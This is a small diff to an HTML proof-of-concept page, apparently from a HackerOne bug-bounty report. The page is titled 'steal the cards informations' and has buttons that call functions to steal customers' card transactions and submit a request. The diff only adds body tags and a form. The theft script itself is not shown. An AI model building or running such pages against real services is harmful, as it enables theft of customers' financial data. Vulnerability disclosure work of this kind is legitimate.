@@ -5,6 +5,7 @@
 <script src=../jquery-3.4.1.min.js></script>
 </head>
 <title>steal the cards informations</title>
+<body>
 </br>
 </br>
 <div>
@@ -23,7 +24,11 @@ click the button to Steal the customer's Transactions!
 <button id="stealCards" onclick="stealCardsTransactions()">Steal the customer's Transactions</button>
 steal customer's cards Transactions
 <textarea id="transactions" style="width: 200px; height: 150px;"></textarea>
+	    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();"/>
+    </form>
 </div>
+
 <script>
 	var cardsID;
 	
@@ -74,4 +79,5 @@ steal customer's cards Transactions
       <input type="button" value="Submit request" onclick="submitRequest();"/>
     </form>
 <a href="https://hackerone.com/johnstone">hacker1 johnstone</a>
+</body>
 </html>
